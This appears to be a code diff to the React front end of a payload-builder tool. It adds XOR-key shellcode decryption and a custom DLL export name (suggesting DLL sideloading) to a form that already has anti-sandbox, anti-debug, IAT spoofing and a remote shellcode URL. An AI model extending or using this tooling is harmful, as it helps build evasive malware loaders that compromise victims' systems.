@@ -33,6 +33,7 @@ export default function CreatorPage() {
         anti_sandbox: [],
         anti_debug: [],
         iat_spoofing: [],
+        export_function_name: 'DllMain',
     });
 
     const [iatFunctions, setIatFunctions] = useState<IATFunction[]>([]);
@@ -43,6 +44,7 @@ export default function CreatorPage() {
     const [isCompiling, setIsCompiling] = useState(false);
     const [error, setError] = useState<string>('');
     const [useShellcodeUrl, setUseShellcodeUrl] = useState(true);
+    const [useXorKey, setUseXorKey] = useState(false);
     const [compilerFlags, setCompilerFlags] = useState<string>('-d:release --opt:size');
 
     // Fetch IAT functions on mount
@@ -100,6 +102,8 @@ export default function CreatorPage() {
                 iat_spoofing: selectedIATFunctions,
                 shellcode: useShellcodeUrl ? undefined : formData.shellcode,
                 shellcode_url: useShellcodeUrl ? formData.shellcode_url : undefined,
+                xor_key: useXorKey ? formData.xor_key : undefined,
+                export_function_name: formData.output === 'dll' ? formData.export_function_name : undefined,
             };
 
             const response = await apiClient.generatePayload(payload);
@@ -208,6 +212,24 @@ export default function CreatorPage() {
                                 </div>
                             </div>
 
+                            {formData.output === 'dll' && (
+                                <div className="space-y-2 animate-in fade-in slide-in-from-top-2 duration-300 border-t pt-4">
+                                    <Label className="flex items-center gap-2">
+                                        Nom de la Fonction Exportée
+                                        <Badge variant="outline" className="text-[10px] py-0">Optionnel</Badge>
+                                    </Label>
+                                    <Input
+                                        value={formData.export_function_name}
+                                        onChange={(e) => setFormData({ ...formData, export_function_name: e.target.value })}
+                                        placeholder="DllMain (par défaut)"
+                                        className="font-mono text-xs"
+                                    />
+                                    <p className="text-[10px] text-muted-foreground">
+                                        Utilisez <b>DllMain</b> pour une exécution au chargement, ou un nom personnalisé (ex: <i>OleUIBusyW</i>).
+                                    </p>
+                                </div>
+                            )}
+
                             <div className="space-y-4 pt-4 border-t">
                                 <div className="flex items-center justify-between">
                                     <Label className="text-base">Source du Shellcode</Label>
@@ -234,6 +256,28 @@ export default function CreatorPage() {
                                             onChange={(e) => setFormData({ ...formData, shellcode: e.target.value })}
                                             placeholder="Paste shellcode here (0x54, 0x..)"
                                             className="min-h-[100px] font-mono text-xs"
+                                        />
+                                    </div>
+                                )}
+                            </div>
+
+                            <div className="space-y-4 pt-4 border-t">
+                                <div className="flex items-center justify-between">
+                                    <Label className="text-base">Déchiffrement XOR</Label>
+                                    <div className="flex items-center gap-2">
+                                        <span className={!useXorKey ? "text-emerald-500 font-medium" : "text-muted-foreground"}>Désactivé</span>
+                                        <Switch checked={useXorKey} onCheckedChange={setUseXorKey} />
+                                        <span className={useXorKey ? "text-emerald-500 font-medium" : "text-muted-foreground"}>Activé</span>
+                                    </div>
+                                </div>
+                                {useXorKey && (
+                                    <div className="space-y-2">
+                                        <Label>Clé XOR (Format: 0xDE, 0xAD...)</Label>
+                                        <Input
+                                            value={formData.xor_key || ''}
+                                            onChange={(e) => setFormData({ ...formData, xor_key: e.target.value })}
+                                            placeholder="0xDE, 0xAD, 0xBE, 0xEF"
+                                            className="font-mono text-xs"
                                         />
                                     </div>
                                 )}
